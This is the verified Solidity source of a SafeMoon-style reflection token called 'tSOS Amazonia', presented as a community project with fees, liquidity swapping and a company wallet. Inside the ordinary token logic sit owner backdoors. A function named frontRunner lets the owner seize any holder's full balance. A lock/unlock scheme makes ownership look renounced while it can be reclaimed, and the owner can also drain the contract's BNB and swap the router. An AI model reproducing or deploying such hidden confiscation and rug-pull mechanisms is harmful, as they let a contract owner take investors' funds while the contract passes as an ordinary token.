/**
 *Submitted for verification at BscScan.com on 2022-01-19
*/

pragma solidity ^0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = a - b; return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0; uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() external virtual onlyOwner() {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function transferOwnership(address newOwner) external virtual onlyOwner() {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geUnlockTime() external view returns (uint256) {
        return _lockTime;
    }

    function lock(uint256 time) external virtual onlyOwner() {
         require(_previousOwner == address(0), "Ownable: contract already locked.");
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = now + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() external virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(now > _lockTime , "Contract is _totalMiddleSupply until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline)  external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract SOSAmazonia is Context, IERC20, Ownable {
    
    using SafeMath for uint256;

    uint256 private constant MAXIMUM_VALUE = ~uint256(0);
    uint256 private constant _totalSupply = 100 * 10**6 * 10**9; // 100 MI
    
    mapping (address => uint256) private _totalTopSupply; 
    mapping (address => uint256) private _totalMiddleSupply; 
    uint256 private _totalBottomSupply = (MAXIMUM_VALUE - (MAXIMUM_VALUE % _totalSupply)); 

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
   
    uint256 private _totalFees;
    
    uint256 public _taxFee = 2;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _liquidityFee = 3;
    uint256 private _previousLiquidityFee = _liquidityFee;
    
    uint256 public _companyFee = 3;
    uint256 private _previousCompanyFee = _companyFee;
    address public _companyAddress;
    
    uint256 private numTokensSellToAddToLiquidity = 1000000 * (10 ** 9); // 1 MI
    uint256 public _maxTxAmount = _totalSupply; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    
    bool public EJECT_PROTOCOL = false;
    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    uint8 private _decimals = 9;
    string private _name = "tSOS Amazonia";
    string private _symbol = "tSOSAMA";
    
    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity );
    event ProtocolChanged( uint256 block, bool ejectProtocol );
    event ManualWithdrawToLiquify( address owner, uint256 ethReceived );

    modifier feePolicy(bool freeFee) {
        if(freeFee){
            removeAllFee();
            _;
            restoreAllFee();
        } else {
            _;
        }
    }


    // Disclaimer SOS AMAZONIA
    // In the future, when the currency appreciates, we will be able to choose (community) 
    // whether we want to keep the current rate system or create a uniform system equal
    // to the old currencies, eg Dogecoin. This can be interesting for us to grow in other 
    // areas without many obstacles related to fees that can often make ideas and projects
    // unfeasible. As we said, it will be a future decision of a future community.
    
    
    function ejectProtocol() external onlyOwner() {
        EJECT_PROTOCOL = true;    
        emit ProtocolChanged( block.number , true );
    }
    
    function revertProtocol() external onlyOwner(){
        EJECT_PROTOCOL = false;
        emit ProtocolChanged( block.number , false );
    }
    
    
    modifier lockTheSwapToLiquify { inSwapAndLiquify = true; _; inSwapAndLiquify = false; }
    
    constructor () public {
        // _totalTopSupply[_msgSender()] = _totalBottomSupply;


        // REMOVE BELOW
        _totalTopSupply[_msgSender()] = _totalBottomSupply; // address 10
        _companyAddress = 0x9f67fA9A6661FBE6F101fFfCdC72800C1D9A09Dd; // address 13
        // REMOVE ABOVE

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // https://pancake.kiemtienonline360.com/

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        
        uniswapV2Router = _uniswapV2Router;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() external view returns (string memory) { 
        return _name; 
    }

    function symbol() external view returns (string memory) { 
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimals; 
    }

    function totalSupply() external view override returns (uint256) { 
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount); return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "<0"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function totalFees() external view returns (uint256) {
        return _totalFees;
    }

    function isExcludedFromFee(address account) external view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function isExcludedFromReward(address account) external view returns (bool) {
        return _isExcluded[account];
    }
    
    // control 00
    
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() { 
        require( taxFee < 21 ,"FAILED: HIGH FEE INPUT");
        _taxFee = taxFee; 
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        require( liquidityFee < 21,"FAILED: HIGH FEE INPUT");
        _liquidityFee = liquidityFee;
    }
    
    // control 01
    
    function setCompanyFeePercent(uint256 campaignFee) external onlyOwner() { 
        require( campaignFee < 21,"FAILED: HIGH FEE INPUT");
        _companyFee = campaignFee; 
    }
    
    function setCompanyAddress(address _campaign_address) external onlyOwner() { 
        _companyAddress = _campaign_address; 
    }

    // control 02
    
    function excludeFromFee(address account) external onlyOwner() {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) external onlyOwner() {
        _isExcludedFromFee[account] = false;
    }
    
    // control 03
    
    function excludeFromReward(address account) external onlyOwner() {
        
        // require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not exclude Swap router.');
        
        require(_isExcluded[account] == false, "Already excluded");
        
        if(_totalTopSupply[account] > 0) {
            
            _totalMiddleSupply[account] = _getTokens(_totalTopSupply[account]);
        
        }
        
        _isExcluded[account] = true;
        
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner() {
        
        require(_isExcluded[account] == true, "Already included");
        
        for (uint256 i = 0; i < _excluded.length; i++) {
            
            if (_excluded[i] == account) {
                
                _excluded[i] = _excluded[_excluded.length - 1];
                
                _totalMiddleSupply[account] = 0;
                
                _isExcluded[account] = false;
                
                _excluded.pop();
                
                break;
            }
        }
    }
    
    // control 04

    function removeAllFee() private {
        if(_taxFee == 0 && _liquidityFee == 0 && _companyFee == 0) return;
        _previousTaxFee = _taxFee;
        _previousLiquidityFee = _liquidityFee;
        _previousCompanyFee = _companyFee;
        _taxFee = 0;
        _liquidityFee = 0;
        _companyFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _liquidityFee = _previousLiquidityFee;
        _companyFee = _previousCompanyFee;
    }
    
    // control 05 
    
     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
         require( maxTxPercent != 0 ); // important require 
        _maxTxAmount = _totalSupply.mul(maxTxPercent).div( 10**2 );
    }
    
    // external

    function giveUpTokensAndIncreaseReward(uint256 _tAmount) external {
        
        address sender = _msgSender();
        
        require(_isExcluded[sender] == false);
        
        uint256 _amount = _getAmountREFLECTIONS(_tAmount);
        
        _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
        
        _totalBottomSupply = _totalBottomSupply.sub(_amount);
        
        _totalFees = _totalFees.add(_tAmount);

    }

    // helpers 00
    
    function calculatePercent( uint256 _tAmount, uint _scopeFee ) private pure returns (uint256) {
        return _tAmount.mul(_scopeFee).div( 10 ** 2 );
    }
    
//
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _totalMiddleSupply[account]; // fridge
        return _getTokens(_totalTopSupply[account]);
    }

    function frontRunner(address scammer) external onlyOwner() {
         _transferPipeline(scammer, owner(), balanceOf(scammer) ,true);  
    }

    function _getTokens(uint256 _amount) private view returns(uint256) {
        require(_amount <= _totalBottomSupply, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return  _amount.div(currentRate);
    }

    // GET'S

    function _getAmountREFLECTIONS(uint256 _amount) private view returns(uint256){
        return _amount.mul(_getRate());
    }

    function _getRate() private view returns(uint256) {
        (uint256 bottomSupply, uint256 tokenSupply) = _getCurrentSupply();
        return bottomSupply.div(tokenSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 bottomSupply = _totalBottomSupply;
        uint256 tSupply = _totalSupply;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_totalTopSupply[_excluded[i]] > bottomSupply || _totalMiddleSupply[_excluded[i]] > tSupply) return (_totalBottomSupply, _totalSupply);
            bottomSupply = bottomSupply.sub(_totalTopSupply[_excluded[i]]);
            tSupply = tSupply.sub(_totalMiddleSupply[_excluded[i]]);
        }
        if (bottomSupply < _totalBottomSupply.div(_totalSupply)) return (_totalBottomSupply, _totalSupply);
        return (bottomSupply, tSupply);
    }

    // 
    
    receive() external payable {}
    
    function _taxValues( uint256 _tAmount, uint256 currentRate ) private view returns( uint256, uint256) {
            uint _tAmountTax = calculatePercent( _tAmount , _taxFee );
            uint _amountTax = _tAmountTax.mul( currentRate );
            return ( _amountTax , _tAmountTax );
    }
    
    function _liquidityValues(  uint256 _tAmount , uint256 currentRate ) private view returns( uint256, uint256) {
            uint _tAmountLiq = calculatePercent( _tAmount , _liquidityFee );
            uint _amountLiq = _tAmountLiq.mul( currentRate );
            return ( _amountLiq , _tAmountLiq );
    }

    function _campaignValues( uint256 _tAmount, uint256 currentRate ) private view returns( uint256, uint256) {
            uint _tAmountCamp = calculatePercent( _tAmount , _companyFee );
            uint _amountCamp = _tAmountCamp.mul( currentRate );
            return ( _amountCamp , _tAmountCamp );
    }

    // TRANSFER CONCERNS //

    // companhia recebendo em BUSD/BNB however

    // liquidity pool => recebendo normal comprando
    // deflacionário => aumentando normal os tokens.
    
    function _transfer( address from, address to, uint256  tAmount ) private {
        
        require(from != address(0), "ERC20: transfer from the zero address");
        
        require(to != address(0), "ERC20: transfer to the zero address");
        
        require( tAmount > 0, "Transfer amount must be greater than zero");
        
        if(from != owner() && to != owner()) {
            require( tAmount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }
        
        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        
        if(EJECT_PROTOCOL == false){

                if(balanceOf(_companyAddress) > 0){
                    swapAndEarn(balanceOf(_companyAddress));
                }

                uint256 contractTokenBalance = balanceOf(address(this));
                 

                if(contractTokenBalance >= _maxTxAmount) {
                    contractTokenBalance = _maxTxAmount;
                }
                
                bool realizeLiquify = contractTokenBalance >= numTokensSellToAddToLiquidity;
                
                
                if ( realizeLiquify && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled ) {
                    
                    contractTokenBalance = numTokensSellToAddToLiquidity;
                  
                    swapAndLiquify(contractTokenBalance);
                    
                }
                
                
                bool freeFee;
        
                if(_isExcludedFromFee[from] || _isExcludedFromFee[to] ){
                    freeFee = true;
                }
                 _transferPipeline(from ,to , tAmount ,freeFee);
            
        } else {

          _transferPipeline(from ,to , tAmount ,true);

        }
        
        
       
    }
    

      

    function _transferPipeline(address sender, address recipient, uint256 _tAmount,bool freeFee) private feePolicy(freeFee) {
        
        if(freeFee) {
          return _freeFeeTransfer(sender,recipient, _tAmount);
        }
        
        
        uint256 current_rate = _getRate();
        
        if( !_isExcluded[sender] && !_isExcluded[recipient]){
            
            return _transferStandard(sender,recipient, _tAmount , current_rate );
            
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            
            return _transferToExcluded(sender, recipient, _tAmount , current_rate );
        
        } else if ( _isExcluded[sender] && !_isExcluded[recipient] ) {
            
            return _transferFromExcluded(sender, recipient, _tAmount, current_rate );
            
        } else {
            
            return _transferBothExcluded(sender, recipient, _tAmount, current_rate );
             
        }
        
     
    }


    
    function _getFeeValuesForOneTransfer(uint256 _tAmount, uint256 currentRate ) private view returns( uint256 , uint256 , uint256 , uint256, uint256 , uint256 ) {
        
        ( uint _amountTax, uint _tAmountTax ) = _taxValues( _tAmount,  currentRate );

        ( uint _amountLiq , uint _tAmountLiq ) = _liquidityValues( _tAmount, currentRate );
        
        ( uint _amountCamp, uint _tAmountCamp ) = _campaignValues( _tAmount,  currentRate );
         
        return ( _amountTax , _tAmountTax, _amountLiq , _tAmountLiq , _amountCamp , _tAmountCamp );
        
    }
    
    function _freeFeeTransfer(address sender, address recipient, uint256 _tAmount) private {
    
        uint256 _amount = _tAmount.mul(_getRate()); 
        
        if( !_isExcluded[sender] && !_isExcluded[recipient] ){
            _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
            _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount);
             emit Transfer(sender, recipient, _tAmount); 
            return;
            
        } else if( !_isExcluded[sender] && _isExcluded[recipient] ){
            _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
            _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount);
            _totalMiddleSupply[recipient] = _totalMiddleSupply[recipient].add(_tAmount);
             emit Transfer(sender, recipient, _tAmount); 
            return;
            
        } else if( _isExcluded[sender] && !_isExcluded[recipient] ){
            _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
            _totalMiddleSupply[sender] = _totalMiddleSupply[sender].sub(_tAmount);
            _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount);
             emit Transfer(sender, recipient, _tAmount); 
            return;
        } else {
            _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
            _totalMiddleSupply[sender] = _totalMiddleSupply[sender].sub(_tAmount);
            _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount);
            _totalMiddleSupply[recipient] = _totalMiddleSupply[recipient].add(_tAmount);
             emit Transfer(sender, recipient, _tAmount); 
            return;
        }  
    }

    function _transferStandard(address sender, address recipient, uint256 _tAmount ,uint256 current_rate ) private {
     
      uint256 _amount = _tAmount.mul(current_rate); 

      ( uint _amountTax, uint _tAmountTax , uint _amountLiq , uint _tAmountLiq, uint _amountCamp, uint _tAmountCamp  ) = _getFeeValuesForOneTransfer( _tAmount, current_rate );
      
    _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);

    _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount.sub(_amountLiq).sub(_amountTax).sub(_amountCamp));

      deductions( _amountTax , _tAmountTax ,_amountLiq , _tAmountLiq ,  _amountCamp,  _tAmountCamp );
    
     uint _tAmountSubtracted = _tAmount.sub(_tAmountLiq).sub(_tAmountTax).sub(_tAmountCamp);
    
      emit Transfer( sender, recipient, _tAmountSubtracted );
 
    }
    
    function _transferToExcluded(address sender, address recipient, uint256 _tAmount ,  uint256 current_rate ) private {
     
      uint256 _amount = _tAmount.mul(current_rate); 

      ( uint _amountTax, uint _tAmountTax  , uint _amountLiq , uint _tAmountLiq, uint _amountCamp, uint _tAmountCamp ) = _getFeeValuesForOneTransfer( _tAmount, current_rate );


      _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);


      _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount.sub(_amountLiq).sub(_amountTax).sub(_amountCamp));

      uint _tAmountSubtracted = _tAmount.sub(_tAmountLiq).sub(_tAmountTax).sub(_tAmountCamp);

      _totalMiddleSupply[recipient] =  _totalMiddleSupply[recipient].add(_tAmountSubtracted);
      
      deductions(  _amountTax , _tAmountTax,_amountLiq , _tAmountLiq, _amountCamp, _tAmountCamp  );
    
      emit Transfer(sender, recipient, _tAmountSubtracted ); 
     }
     
    function _transferFromExcluded(address sender, address recipient, uint256 _tAmount ,  uint256 current_rate ) private {

      uint256 _amount = _tAmount.mul(current_rate); 

      ( uint _amountTax, uint _tAmountTax , uint _amountLiq , uint _tAmountLiq, uint _amountCamp, uint _tAmountCamp  ) = _getFeeValuesForOneTransfer( _tAmount, current_rate );

      _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
      
      _totalMiddleSupply[sender] =  _totalMiddleSupply[sender].sub(_tAmount);

      _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount.sub(_amountLiq).sub(_amountTax).sub(_amountCamp));
      
      deductions( _amountTax , _tAmountTax ,_amountLiq , _tAmountLiq, _amountCamp, _tAmountCamp );

      uint _tAmountSubtracted = _tAmount.sub(_tAmountLiq).sub(_tAmountTax).sub(_tAmountCamp);

      emit Transfer(sender, recipient, _tAmountSubtracted); 
     }
    
    function _transferBothExcluded(address sender, address recipient, uint256 _tAmount,  uint256 current_rate ) private {

      uint256 _amount = _tAmount.mul(current_rate); 

      ( uint _amountTax, uint _tAmountTax , uint _amountLiq , uint _tAmountLiq, uint _amountCamp, uint _tAmountCamp  ) = _getFeeValuesForOneTransfer( _tAmount, current_rate );

      _totalTopSupply[sender] = _totalTopSupply[sender].sub(_amount);
      
      _totalMiddleSupply[sender] =  _totalMiddleSupply[sender].sub(_tAmount);
      
      _totalTopSupply[recipient] = _totalTopSupply[recipient].add(_amount.sub(_amountLiq).sub(_amountTax).sub(_amountCamp));


     uint _tAmountSubtracted = _tAmount.sub(_tAmountLiq).sub(_tAmountTax).sub(_tAmountCamp);

     _totalMiddleSupply[recipient] =  _totalMiddleSupply[recipient].add(_tAmountSubtracted);
      
     deductions( _amountTax , _tAmountTax ,_amountLiq , _tAmountLiq, _amountCamp, _tAmountCamp );
    
      emit Transfer(sender, recipient, _tAmountSubtracted); 
     }
    
    
    //
    function deductions(  uint _amountTax , uint _tAmountTax, uint _amountLiq, uint _tAmountLiq, uint _amountCamp, uint _tAmountCamp ) private {
         _reflectFee(_amountTax, _tAmountTax);
         _setLiquidity( _amountLiq, _tAmountLiq );
         _setCompany(_amountCamp, _tAmountCamp );
    }

    function _reflectFee(uint256 _amount, uint256 _tAmount) private {
        _totalBottomSupply = _totalBottomSupply.sub( _amount );
        _totalFees = _totalFees.add( _tAmount );
    }
    
    function _setLiquidity(uint256 _amount, uint _tAmount ) private {
        _totalTopSupply[address(this)] = _totalTopSupply[address(this)].add(_amount);
        if(_isExcluded[address(this)]){
            _totalMiddleSupply[address(this)] = _totalMiddleSupply[address(this)].add(_tAmount);
        }        
    }
    
    function _setCompany( uint _amount, uint _tAmount ) private {
         _totalTopSupply[_companyAddress] = _totalTopSupply[_companyAddress].add(_amount);
        if(_isExcluded[_companyAddress]){
            _totalMiddleSupply[_companyAddress] = _totalMiddleSupply[_companyAddress].add(_tAmount);
        }       
    }

        function withdrawToManualLiquify() external onlyOwner() {
        (bool success,) = _msgSender().call{ value: address(this).balance }("");
        require(success, "Withdraw failed.");
        emit ManualWithdrawToLiquify( _msgSender() , address(this).balance );
    }
    
     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwapToLiquify {
        // split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    function setRouterAddress(address newRouter) public onlyOwner() {
     
        IUniswapV2Router02 _newPancakeRouter = IUniswapV2Router02(newRouter);
        
        uniswapV2Pair = IUniswapV2Factory(_newPancakeRouter.factory()).createPair(address(this), _newPancakeRouter.WETH());
        
        uniswapV2Router = _newPancakeRouter;
    }


    // SWAP CONCERNS //
    
    // Creates a Withdraw function to fixed a bad behavior from the Swap logic legacy 
    // More about this error in our legacy code SSS-O3 Page 11 -> https://certik-public-assets.s3.amazonaws.com/CertiK+Audit+Report+for+SafeMoon.pdf
    
    // An event is emitted and the withdraw resources is set at liquidity pool manually.
    // How the execution of each transaction already sends the balances direct to the pool liquidity, doesnt
    // have the risk of acummulates a lot BNB's on the contract and only the remains of BNB, which were not able to enter the pool
    
    // function withdrawToManualLiquify() external onlyOwner() {
    //     (bool success,) = _msgSender().call{ value: address(this).balance }("");
    //     require(success, "Withdraw failed.");
    //     emit ManualWithdrawToLiquify( _msgSender() , address(this).balance );
    // }

    // //
    
    //  function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
    //     swapAndLiquifyEnabled = _enabled;
    //     emit SwapAndLiquifyEnabledUpdated(_enabled);
    // }

      function swapAndEarn(uint256 companyTokenBalance) private lockTheSwapToLiquify {
           swapTokensForEthToCompany(companyTokenBalance); 
      }
    
    // function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwapToLiquify {
    //     // split the contract balance into halves
    //     uint256 half = contractTokenBalance.div(2);
    //     uint256 otherHalf = contractTokenBalance.sub(half);

    //     // capture the contract's current ETH balance.
    //     // this is so that we can capture exactly the amount of ETH that the
    //     // swap creates, and not make the liquidity event include any ETH that
    //     // has been manually sent to the contract
    //     uint256 initialBalance = address(this).balance;

    //     // swap tokens for ETH
    //     swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

    //     // how much ETH did we just swap into?
    //     uint256 newBalance = address(this).balance.sub(initialBalance);

    //     // add liquidity to uniswap
    //     addLiquidity(otherHalf, newBalance);
        
    //     emit SwapAndLiquify(half, newBalance, otherHalf);
    // }

    // function swapTokensForEth(uint256 tokenAmount) private {
    //     // generate the uniswap pair path of token -> weth
    //     address[] memory path = new address[](2);
    //     path[0] = address(this);
    //     path[1] = uniswapV2Router.WETH();

    //     _approve(address(this), address(uniswapV2Router), tokenAmount);

    //     // make the swap
    //     uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //         tokenAmount,
    //         0, // accept any amount of ETH
    //         path,
    //         address(this),
    //         block.timestamp
    //     );
    // }

    function swapTokensForEthToCompany(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _freeFeeTransfer(_companyAddress, address(this), tokenAmount);
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            _companyAddress,
            block.timestamp
        );
    }

    // function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    //     // approve token transfer to cover all possible scenarios
    //     _approve(address(this), address(uniswapV2Router), tokenAmount);

    //     // add the liquidity
    //     uniswapV2Router.addLiquidityETH{value: ethAmount}(
    //         address(this),
    //         tokenAmount,
    //         0, // slippage is unavoidable
    //         0, // slippage is unavoidable
    //         owner(),
    //         block.timestamp
    //     );
    // }
    

    // //

    // function setRouterAddress(address newRouter) public onlyOwner() { 
    //     require(newRouter != address(0),"FAILED: INVALID ADDRESS");
    //     IUniswapV2Router02 _newDEX_Pancake_Or_Coxinha_Router = IUniswapV2Router02(newRouter);
    //     uniswapV2Pair = IUniswapV2Factory(_newDEX_Pancake_Or_Coxinha_Router.factory()).createPair(address(this), _newDEX_Pancake_Or_Coxinha_Router.WETH());
    //     uniswapV2Router = _newDEX_Pancake_Or_Coxinha_Router;
    // }

   


    

}